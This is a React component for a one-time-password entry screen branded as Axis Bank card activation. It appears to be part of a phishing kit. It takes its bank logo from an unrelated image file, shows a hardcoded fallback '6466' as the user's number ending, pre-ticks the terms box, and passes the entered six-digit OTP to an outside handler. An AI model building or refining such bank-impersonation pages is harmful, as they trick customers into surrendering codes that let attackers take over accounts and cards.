/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { ShieldCheck, ArrowLeft, Info } from 'lucide-react';
// @ts-ignore
import defaultLogoImage from '../../images/myindierf.jpg';

interface OtpStep2Props {
  mobileNumber: string;
  onSubmit: (otp: string) => void;
  onResend: () => void;
  onBack?: () => void;
}

export default function OtpStep2({
  mobileNumber,
  onSubmit,
  onResend,
  onBack,
}: OtpStep2Props) {
  useEffect(() => {
    window.scrollTo(0, 0);
    if (document.documentElement) document.documentElement.scrollTop = 0;
    if (document.body) document.body.scrollTop = 0;
    const container = document.getElementById('app-root-container');
    if (container) container.scrollTop = 0;
  }, []);

  const [otp, setOtp] = useState('');
  const [termsAccepted, setTermsAccepted] = useState(true);
  const [whatsappConsent, setWhatsappConsent] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const lastFour = mobileNumber.length >= 4 ? mobileNumber.slice(-4) : '6466';

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!otp.trim() || otp.replace(/\D/g, '').length !== 6) {
      setError('Please enter a valid 6-digit OTP');
      return;
    }
    if (!termsAccepted) {
      setError('You must agree to the Terms & Conditions to proceed');
      return;
    }
    setError(null);
    onSubmit(otp.replace(/\D/g, ''));
  };

  return (
    <div className="max-w-xl mx-auto px-4 py-4" id="otp-step-2-view">
      {/* Top Verification Banner */}
      <div className="bg-white rounded-3xl border border-gray-100 shadow-sm p-6 mb-6 space-y-4 relative overflow-hidden">
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-[#8B0000] rounded-t-3xl" />
        <div className="flex justify-between items-center">
          <div className="flex items-center gap-3">
            {onBack && (
              <button
                type="button"
                onClick={onBack}
                className="p-1 rounded-full hover:bg-gray-100 text-[#8B0000] transition-colors"
              >
                <ArrowLeft className="w-5 h-5" />
              </button>
            )}
            <img src={defaultLogoImage} alt="Axis Bank" className="h-10 max-w-[140px] object-contain rounded-md" />
          </div>
          <div className="flex items-center gap-1.5 text-[10px] md:text-xs text-emerald-600 bg-emerald-50 border border-emerald-100 px-3 py-1 rounded-full font-bold tracking-wide uppercase">
            <ShieldCheck className="w-3.5 h-3.5" />
            <span>VERIFICATION</span>
          </div>
        </div>

        <div className="flex flex-col md:flex-row items-center justify-between gap-4 pt-2">
          <div className="space-y-1.5 flex-1">
            <h1 className="text-xl md:text-2xl font-bold text-gray-900 tracking-tight">
              Verification
            </h1>
            <p className="text-xs md:text-sm text-gray-600 leading-relaxed font-medium">
              Please enter the 6-digit One Time Password (OTP) sent to your registered mobile number ending in ******{lastFour}.
            </p>
          </div>
          <div className="w-full md:w-auto flex justify-center">
            <img src="/otp_image.jpeg" alt="Verification Illustration" className="max-h-36 w-auto object-contain" />
          </div>
        </div>
      </div>

      {/* Login Card Form */}
      <form onSubmit={handleSubmit} className="bg-white rounded-3xl border border-gray-100 shadow-sm p-6 md:p-8 space-y-6">
        <div className="text-center space-y-1 pb-2">
          <h2 className="text-2xl font-extrabold text-gray-900 tracking-tight">
            Login
          </h2>
          <p className="text-xs text-gray-500 font-semibold">
            Enter 6-digit OTP sent to your mobile number
          </p>
        </div>

        {error && (
          <div className="p-3 rounded-2xl bg-red-50 border border-red-100 text-red-600 text-xs font-bold text-center">
            {error}
          </div>
        )}

        <div className="space-y-4">
          <div className="space-y-1.5 text-left">
            <label className="block text-xs md:text-sm font-bold text-gray-700" htmlFor="otpCode">
              Enter 6-digit OTP sent to your mobile number
            </label>
            <input
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              id="otpCode"
              maxLength={6}
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
              placeholder="Enter 6-digit OTP"
              className="block w-full px-4 py-3.5 bg-white border border-gray-200 focus:border-[#8B0000] focus:ring-4 focus:ring-rose-200 rounded-2xl text-lg font-mono tracking-widest text-center placeholder-gray-400 outline-none transition-all text-gray-800"
            />
          </div>

          {/* Terms checkbox */}
          <div className="flex items-start gap-3 pt-2 text-left">
            <input
              type="checkbox"
              id="terms"
              checked={termsAccepted}
              onChange={(e) => setTermsAccepted(e.target.checked)}
              className="mt-1 w-5 h-5 rounded text-[#8B0000] focus:ring-[#8B0000] border-gray-300 cursor-pointer"
            />
            <label htmlFor="terms" className="text-xs text-gray-700 font-medium leading-relaxed select-none cursor-pointer">
              By entering OTP and proceeding, I agree to the Terms & Conditions associated with Axis Bank Card activation and setup.
            </label>
          </div>

          {/* WhatsApp consent checkbox */}
          <div className="flex items-start gap-3 text-left">
            <input
              type="checkbox"
              id="whatsapp"
              checked={whatsappConsent}
              onChange={(e) => setWhatsappConsent(e.target.checked)}
              className="mt-1 w-5 h-5 rounded text-[#8B0000] focus:ring-[#8B0000] border-gray-300 cursor-pointer"
            />
            <label htmlFor="whatsapp" className="text-xs text-gray-700 font-medium leading-relaxed select-none cursor-pointer">
              Yes, I consent to receiving important alerts and exclusive offers on WhatsApp from Axis Bank.
            </label>
          </div>
        </div>

        {/* Verify & Proceed Button */}
        <div className="pt-2 space-y-4">
          <button
            type="submit"
            className="w-full bg-[#8B0000] hover:bg-[#720000] active:bg-[#5A0000] active:scale-[0.98] text-white py-4 px-6 rounded-2xl font-bold tracking-wide transition-all shadow-md hover:shadow-lg flex items-center justify-center gap-2 cursor-pointer touch-manipulation select-none text-base"
            id="btn-verify-proceed"
          >
            Verify & Proceed
          </button>

          <div className="flex justify-center items-center gap-2 text-xs pt-1">
            <span className="text-gray-500 font-medium">Didn't receive the OTP?</span>
            <button
              type="button"
              onClick={onResend}
              className="text-[#8B0000] font-bold hover:underline cursor-pointer"
              id="btn-resend-step2"
            >
              Resend
            </button>
          </div>
        </div>
      </form>
    </div>
  );
}
